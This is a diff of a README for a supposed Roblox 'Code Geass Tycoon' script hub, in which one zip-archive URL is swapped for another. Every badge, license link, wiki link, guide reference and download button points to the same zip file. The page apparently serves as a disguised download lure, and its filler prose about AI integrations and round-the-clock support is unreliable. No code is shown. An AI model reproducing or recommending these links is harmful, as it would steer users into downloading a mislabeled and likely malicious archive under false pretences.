@@ -1,10 +1,10 @@
 # 👑 Code Geass Tycoon Roblox Script
 
-[![Stars](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)]()  
-[![Forks](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)]()  
-[![License: MIT](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)  
-[![Roblox](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip%20Platform-Roblox-brightgreen)]()  
-[![API-Ready](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)]()  
+[![Stars](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)]()  
+[![Forks](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)]()  
+[![License: MIT](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)  
+[![Roblox](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip%20Platform-Roblox-brightgreen)]()  
+[![API-Ready](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)]()  
 
 Welcome to the **Code Geass Tycoon Roblox Script** repository—a creative sanctuary where automation, custom user experiences, and the riveting world of Code Geass entwine within the expansive Roblox universe.
 
@@ -16,11 +16,11 @@ Dive beneath the mask, outwit your rivals, and orchestrate the ultimate Tycoon s
 
 | Operating System        | Script Utility | UI Integration | Performance Boost |
 |------------------------|:--------------:|:--------------:|:----------------:|
-| ![Windows](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip%2B-blue?logo=Windows) | ✔️ | ✔️ | 🚀 |
-| ![MacOS](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip%2B-lightgrey?logo=apple) | ✔️ | ✔️ | 🚀 |
-| ![Linux](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip%2018%2B-yellow?logo=linux) | ✔️ | ✔️ | 🏎️ |
-| ![iOS](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip%2B-blue?logo=apple) | ⚠️* | ⚠️* | 🐢 |
-| ![Android](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip%2B-green?logo=android) | ⚠️* | ⚠️* | 🐢 |
+| ![Windows](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip%2B-blue?logo=Windows) | ✔️ | ✔️ | 🚀 |
+| ![MacOS](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip%2B-lightgrey?logo=apple) | ✔️ | ✔️ | 🚀 |
+| ![Linux](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip%2018%2B-yellow?logo=linux) | ✔️ | ✔️ | 🏎️ |
+| ![iOS](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip%2B-blue?logo=apple) | ⚠️* | ⚠️* | 🐢 |
+| ![Android](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip%2B-green?logo=android) | ⚠️* | ⚠️* | 🐢 |
 
 > _*Partial support—requires additional steps for full compatibility. See Wiki for more details._
 
@@ -77,9 +77,9 @@ Our script doesn’t simply automate; it *liberates* your playstyle!
 To empower your Roblox Code Geass Tycoon world with this feature-rich script:
 
 **Step 1:** Download the core script files from the link below.  
-**Step 2:** Follow our detailed guide in the `https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip` for seamless integration.
+**Step 2:** Follow our detailed guide in the `https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip` for seamless integration.
 
-[![Download](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)
+[![Download](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)
 
 **Note:** This script is designed for Roblox Studio and may require external API keys for OpenAI or Claude integrations.
 
@@ -88,7 +88,7 @@ To empower your Roblox Code Geass Tycoon world with this feature-rich script:
 ## 🏆 Contribution Guidelines
 
 Eager to bend the shape of Geass Tycoon to your vision?  
-- See `https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip` for branching, code style, and feature request guidelines.  
+- See `https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip` for branching, code style, and feature request guidelines.  
 - Pull requests are reviewed by a roundtable of fellow strategists; creativity is always welcome.
 
 ---
@@ -97,7 +97,7 @@ Eager to bend the shape of Geass Tycoon to your vision?
 
 - Join discussions in the Issues or Discussions tab
 - Need live help? Our 24/7 support squad is always on hand—drop a note!
-- Bugs, features, or balancing requests? File them using the template in `https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip`.
+- Bugs, features, or balancing requests? File them using the template in `https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip`.
 
 ---
 
@@ -112,7 +112,7 @@ This script is a user-generated resource designed for educational, entertainment
 Copyright (c) 2025  
 
 This repository is open-source under the MIT License. View the full license details here:  
-[MIT License](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)
+[MIT License](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)
 
 ---
 
@@ -120,8 +120,8 @@ This repository is open-source under the MIT License. View the full license deta
 
 Missed a step? Download the most up-to-date package or explore our integrations:
 
-[![Download](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip)
+[![Download](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip)
 
-For more information, strategy breakdowns, or to awaken new Geass abilities, see the [Wiki](https://raw.githubusercontent.com/miradeviar/code-geass-tycoon-roblox-script-hub/branch/pundonor/code-geass-tycoon-roblox-script-hub_v3.4-alpha.1.zip).
+For more information, strategy breakdowns, or to awaken new Geass abilities, see the [Wiki](https://github.com/miradeviar/code-geass-tycoon-roblox-script-hub/raw/refs/heads/branch/pundonor/roblox-tycoon-hub-code-geass-script-3.6.zip).
 
 ---
